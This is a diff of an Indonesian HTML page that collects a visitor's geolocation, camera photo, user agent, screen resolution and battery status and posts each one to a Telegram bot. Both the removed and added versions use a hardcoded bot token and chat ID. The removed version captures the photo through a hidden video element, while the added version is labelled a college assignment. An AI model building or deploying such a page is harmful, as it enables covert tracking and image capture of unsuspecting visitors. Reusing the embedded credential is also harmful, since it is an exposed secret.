@@ -1,107 +1,87 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Bot sadsadTelegram</title>
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation);
-            } else {
-                alert("Geolocation is not supported by this browser.");
-            }
-        }
-
-        function sendLocation(position) {
-            var latitude = position.coords.latitude;
-            var longitude = position.coords.longitude;
-
-            // Kirim data lokasi ke Telegram HTTP API
-            $.post(
-                "https://api.telegram.org/bot<6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ>/sendLocation",
-                {
-                    chat_id: "<1121369247>",
-                    latitude: latitude,
-                    longitude: longitude
-                },
-                function (data, status) {
-                    if (status === "success") {
-                        alert("Lokasi berhasil dikirim ke Telegram.");
-                    } else {
-                        alert("Gagal mengirim lokasi ke Telegram.");
-                    }
-                }
-            );
-        }
-
-        function takePhoto() {
-            var video = document.querySelector("#videoElement");
-
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true }).then(function (stream) {
-                    video.srcObject = stream;
-                    video.play();
-
-                    // Ambil gambar dari video
-                    setTimeout(function () {
-                        var canvas = document.createElement("canvas");
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-                        var image = canvas.toDataURL("image/jpeg");
-
-                        // Kirim foto ke Telegram HTTP API
-                        $.post(
-                            "https://api.telegram.org/bot<6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ>/sendPhoto",
-                            {
-                                chat_id: "<1121369247>",
-                                photo: image
-                            },
-                            function (data, status) {
-                                if (status === "success") {
-                                    alert("Foto berhasil dikirim ke Telegram.");
-                                } else {
-                                    alert("Gagal mengirim foto ke Telegram.");
-                                }
-                            }
-                        );
-
-                        video.srcObject.getVideoTracks().forEach(function (track) {
-                            track.stop();
-                        });
-                    }, 2000);
-                });
-            } else {
-                alert("Browser tidak mendukung pengambilan foto.");
-            }
-        }
-
-        function sendDeviceInfo() {
-            var deviceInfo = "Browser: " + navigator.userAgent;
-
-            // Kirim informasi perangkat ke Telegram HTTP API
-            $.post(
-                "https://api.telegram.org/bot<6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ>/sendMessage",
-                {
-                    chat_id: "<1121369247>",
-                    text: deviceInfo
-                },
-                function (data, status) {
-                    if (status === "success") {
-                        alert("Informasi perangkat berhasil dikirim ke Telegram.");
-                    } else {
-                        alert("Gagal mengirim informasi perangkat ke Telegram.");
-                    }
-                }
-            );
-        }
-    </script>
+  <title>Tugas Kuliah - Bot Telegram</title>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
 <body>
-    <h1>Bot Telegram</h1>
-    <button onclick="getLocation()">Kirim Lokasi</button>
-    <button onclick="takePhoto()">Ambil Foto</button>
-    <button onclick="sendDeviceInfo()">Kirim Informasi Perangkat</button>
-    <video id="videoElement" style="display: none;"></video>
+  <h1>Tugas Kuliah - Bot Telegram</h1>
+  <button onclick="takePhoto()">Ambil Foto</button>
+  <button onclick="getLocation()">Dapatkan Lokasi</button>
+  <button onclick="getDeviceInfo()">Dapatkan Informasi Perangkat</button>
+  <button onclick="getBatteryInfo()">Dapatkan Informasi Baterai</button>
+
+  <script>
+    // Ganti dengan token bot Telegram Anda
+    const token = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+    // Ganti dengan chat ID tujuan
+    const chatId = '1121369247';
+
+    function sendTelegramMessage(text) {
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+      const data = { chat_id: chatId, text: text };
+      $.post(url, data);
+    }
+
+    function sendTelegramPhoto(photo) {
+      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+      const data = { chat_id: chatId, photo: photo };
+      $.post(url, data);
+    }
+
+    function takePhoto() {
+      // Mengambil foto dengan bantuan <input type="file">
+      const fileInput = document.createElement('input');
+      fileInput.type = 'file';
+      fileInput.accept = 'image/*';
+
+      fileInput.addEventListener('change', function(event) {
+        const file = event.target.files[0];
+        const reader = new FileReader();
+        reader.onload = function() {
+          const photoData = reader.result;
+          sendTelegramPhoto(photoData);
+        };
+        reader.readAsDataURL(file);
+      });
+
+      fileInput.click();
+    }
+
+    function getLocation() {
+      if ('geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const locationText = `Lokasi: ${lat}, ${lon}`;
+          sendTelegramMessage(locationText);
+        });
+      } else {
+        sendTelegramMessage('Maaf, peramban tidak mendukung geolokasi.');
+      }
+    }
+
+    function getDeviceInfo() {
+      const deviceInfo = `
+        Browser: ${navigator.userAgent}
+        Resolusi Layar: ${screen.width}x${screen.height}
+      `;
+      sendTelegramMessage(deviceInfo);
+    }
+
+    function getBatteryInfo() {
+      if ('getBattery' in navigator) {
+        navigator.getBattery().then(function(battery) {
+          const batteryInfo = `
+            Level Baterai: ${battery.level * 100}%
+            Pengisian: ${battery.charging ? 'Ya' : 'Tidak'}
+          `;
+          sendTelegramMessage(batteryInfo);
+        });
+      } else {
+        sendTelegramMessage('Maaf, peramban tidak mendukung informasi baterai.');
+      }
+    }
+  </script>
 </body>
 </html>
